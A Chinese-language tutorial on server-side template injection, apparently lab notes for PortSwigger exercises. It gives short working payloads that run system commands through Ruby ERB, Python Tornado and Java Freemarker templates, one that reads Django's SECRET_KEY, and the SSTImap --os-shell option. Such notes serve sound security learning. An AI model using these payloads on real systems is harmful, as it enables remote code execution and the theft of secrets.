---
title: SSTI服务端&模板注入&利用分类&语言引擎&数据渲染&项目工具&挖掘思路
published: 2026-07-10
description: SSTI（服务器模板注入）是指服务端将用户输入未经处理直接拼入模板渲染，导致执行恶意代码的漏洞。利用时先确定模板引擎（如Jinja2、Freemarker等），再通过对象链寻找原生对象并实例化目标对象执行系统命令。实际测试中可使用SSTImap等自动化工具辅助检测与利用。
tags:
  - Web攻防
  - SSTI
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-SSTI-利用分类&功能点
2. WEB攻防-SSTI-利用项目&挖掘思路

SSTI(Server Side Template Injection) 服务器模板注入, 服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容。

参考：https://www.cnblogs.com/R3col/p/12746485.html

# SSTI测试

靶场地址：https://portswigger.net/web-security/all-labs#server-side-template-injection

## Ruby-ERB模板

```
<%= exec 'ls -al' %>
```

## Python-Tornado模板

```
blog-post-author-display=user.name}}{{7*7}}

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('ls%20-al')
```

## Java-Freemarker模板

```
<#assign test="freemarker.template.utility.Execute"?new()> ${test("ls")}
```

## 报错提示

见靶场->存在未知语言的服务器端模板注入漏洞

## Python-Django模板

获取key

```
{{settings.SECRET_KEY}}
```

# SSTI利用思路

1、确定模板引擎

先判断目标使用什么语言，再对比图片确定大致范围。

使用wappalyzer插件来辅助识别

白盒看pom.xml调用的模板引擎

2、构造payload的思路

寻找可用对象（比如字符串、字典，或者已给出的对象）

通过可用对象寻找原生对象（object）

利用原生对象实例化目标对象（比如os）

执行代码

3、如果手工有困难，可用使用Tqlmap或SSTImap代替

**和XSS挖掘类似，重点就是看有没有渲染的地方，模板是什么**

# SSTImap

地址：https://github.com/vladko312/SSTImap

```
-u 地址 --os-shell
```

# 项目

https://github.com/epinna/tplmap

# 挖掘

https://forum.butian.net/share/1229